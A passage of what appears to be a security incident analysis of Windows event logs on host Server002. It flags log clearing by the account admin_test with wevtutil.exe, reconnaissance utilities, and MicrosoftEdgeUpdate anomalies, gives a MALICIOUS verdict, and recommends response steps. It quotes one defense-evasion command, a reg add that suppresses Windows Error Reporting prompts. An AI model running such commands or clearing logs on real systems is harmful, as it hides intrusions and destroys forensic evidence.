1. **Immediate Isolation**: Isolate the affected host `Server002` from the network to prevent further lateral movement.
2. **Review Privileged Accounts**: Investigate the `admin_test` account for unauthorized access or compromise.
3. **Log Audit**: Conduct a thorough audit of event logs on other systems for similar activities, particularly focusing on NTLM logons and privilege assignments.
4. **Conduct a Forensic Investigation**: Analyze the system for any dropped or executing malicious payloads, and identify potential backdoors or persistence mechanisms.
5. **Strengthen Monitoring**: Implement enhanced logging and alerting for privileged activities and log clearing commands across critical systems.

Finally, prepare a comprehensive incident response and recovery plan to secure the environment and prevent future compromises."

   - The Security Event ID 1102 indicates that the security log was cleared by an account named `admin_test`. This action is a strong indicator of attempts to cover tracks and is typically associated with malicious activity. 
   - Similarly, System Event ID 104 indicates the clearing of multiple system logs, by the same account `admin_test`.

2. **Usage of wevtutil.exe:**
   - Multiple occurrences of `wevtutil.exe` are noted. This utility was used to clear logs for multiple event channels such as Sysmon, Application, and Security. 
   - Using `wevtutil.exe` for log management without a legitimate administrative purpose can indicate attempts to tamper with logs to erase traces of potentially harmful activities. 

3. **Registry Modification Using cmd.exe:**
   - The process `cmd.exe` executed with parameters to modify Windows Error Reporting settings using `reg.exe`. This action (`reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f`) is suspicious as altering error reporting can be used to suppress warning messages of crash reports that may expose malicious activity.

4. **High Integrity Level and Administrator Involvement:**
   - The notable actions like clearing logs and registry modifications were executed at a high integrity level, indicating administrative privileges were compromised or misused.
   - User `SERVER002\admin_test` is common across these events, suggesting actions were carried out under this user’s account, which could potentially be compromised.

5. **Unusual Execution of System Utilities:**
   - Commands such as `whoami.exe` and `hostname.exe` were executed, which are commonly used by attackers to gather system information post-exploitation.

6. **EdgeUpdate Anomalies:**
   - Repeated updates and installations related to `MicrosoftEdgeUpdate.exe` are observed. While this could be benign, in the context of other suspicious activities, it may suggest misuse under the guise of legitimate software operations, potentially for persistence or stealth.

**Assessment:**

- Based on the logs provided, activities around log clearance (using `wevtutil.exe` and manual clearing entries in logs), administrative tool usage, and registry modifications collectively suggest malicious intent. Such behaviors are consistent with techniques utilized by attackers to cover their activities post-compromise.

**Resolution:**

- **MALICIOUS**: The actions noted, including log clearing and registry modifications, along with administrative privileges usage, indicate a strong likelihood of malicious activity intended to obstruct forensic analysis and maintain unauthorized control over the system.

**Guidance:**

1. **Immediate Actions:**
   - Conduct a comprehensive investigation into the user account `admin_test` for unauthorized access or compromise.
   - Isolate `Server002` for further forensic analysis to prevent further damage.
   
2. **Forensic Collection and Analysis:**
   - Capture memory, disk images, and relevant logs for a detailed forensic analysis.
   - Review any external connections or files modified during the suspicious time frame.

3. **Incident Response:**
   - Implement incident response procedures, including alerting the relevant stakeholders and possibly involving law enforcement if applicable.
   - Conduct a system-wide review for additional signs of compromise across the infrastructure.

4. **Preventive Measures:**
   - Strengthen log monitoring and implement stringent access controls to detect and mitigate any future occurrences.
   - Educate users and administrators on recognizing suspicious activities and the importance of reporting them promptly."
